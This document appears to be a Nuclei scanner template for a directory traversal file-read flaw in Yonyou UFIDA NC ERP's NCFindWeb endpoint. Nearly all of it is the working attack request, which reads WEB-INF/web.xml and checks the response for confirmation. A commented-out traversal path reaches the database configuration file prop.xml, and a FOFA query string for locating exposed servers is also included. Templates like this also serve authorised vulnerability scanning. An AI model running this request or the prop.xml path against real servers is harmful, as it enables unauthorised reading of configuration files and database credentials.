id: yonyou_nc_NCFindweb_read_file

info:
  name: yonyou_nc_NCFindweb_read_file
  author: mczilong
  severity: critical
  description: 利用数据库文件路径：/NCFindWeb?service=IPreAlertConfigService&filename=../../ierp/bin/prop.xml
    # - "//用友 FE协作办公平台 templateOfTaohong_manager.jsp 目录遍历漏洞"
    # - "fofa app="用友-UFIDA-NC" 
    # - "利用数据库文件路径：/NCFindWeb?service=IPreAlertConfigService&filename=../../ierp/bin/prop.xml"
  reference: "http://wiki.peiqi.tech/wiki/oa/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8B%20ERP-NC%20NCFindWeb%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E.html"
  tags: yonyou,oa,bjxsec

requests:
  - method: GET
    path:
      - "{{RootURL}}/NCFindWeb?service=IPreAlertConfigService&filename=WEB-INF/web.xml"
      # - "{{BaseURL}}/NCFindWeb?service=IPreAlertConfigService&filename=../../ierp/bin/prop.xml"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: body
        words:
          - "<listener>"
          - "<?xml"
